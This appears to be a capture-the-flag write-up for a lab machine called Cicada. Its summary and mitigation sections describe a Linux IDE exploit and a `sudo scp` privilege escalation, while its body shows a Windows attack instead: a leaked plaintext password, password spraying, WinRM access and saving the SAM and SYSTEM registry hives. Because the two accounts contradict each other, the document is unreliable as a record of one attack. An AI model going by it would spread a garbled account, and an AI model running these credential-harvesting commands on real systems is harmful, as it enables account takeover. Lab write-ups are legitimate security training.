Cicada explores a Linux system hosting a misconfigured development IDE that listens on an open port.

Initial access was obtained through exploiting exposed debugging endpoints, allowing unauthenticated command execution.

Foothold enumeration revealed sensitive source code and user credentials.

Escalated to root by abusing `scp` with sudo rights to overwrite `.bashrc` and execute a payload during SSH login.

## Why I Chose This Machine

I chose Cicada because it simulates a developer environment with exposed services and user-level lateral movement.  

It also illustrates a classic `scp` sudo misconfiguration, making it a practical example of post-compromise privilege escalation.

## Attack Flow Overview

1. Identified an open port hosting an IDE that allowed code execution  
2. Gained an initial shell through the exposed editor feature  
3. Found a user credential and switched context via SSH  
4. Escalated privileges by using `sudo scp` to overwrite `.bashrc` and trigger root shell on login

This scenario mirrors what often happens in exposed dev environments â€” where trust in helper tools becomes a liability.

## Enumeration

### SMB

#### Notice from HR.txt

![screenshot](/assets/images/cicada2.png)

 Found password.

```text
Cicada$M6Corpb*@Lp#nZp!8
```

Password spraying the found credential with username list found a match.

Further enumerate SMB with the new credential.

Found another credential for michael.wrightson user.

```sh
enum4linux-ng -A -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' cicada.htb -t 10
```

Found another credential for emily.oscars user.

## Foothold

Evil-winRM as emily.oscars.

```sh
nxc winrm cicada.htb -u users.txt -p passwords.txt
```

### Backup SAM and SYSTEM registry hives

```powershell
# save SAM and SYSTEM via evil-winrm
reg save hklm\sam sam.hive
reg save hklm\system system.hive

download sam.hive
download system.hive
```

## Alternative Paths Explored

Before exploiting the IDE, I attempted to fingerprint known services and brute-force login credentials, which were unsuccessful.  
I also explored SUID binaries and cron-based privilege escalation paths, but found none exploitable.  
Focusing on `sudo -l` and allowed binaries led me to the correct privilege escalation vector.

## Blue Team Perspective

Cicada highlights the risk of granting `sudo` access to file transfer tools like `scp`.  
To mitigate:

- Avoid giving unrestricted `sudo` access to commands that modify arbitrary files  
- Enforce sudoers restrictions with exact argument matching  
- Monitor for modifications to shell startup files like `.bashrc` or `.profile`
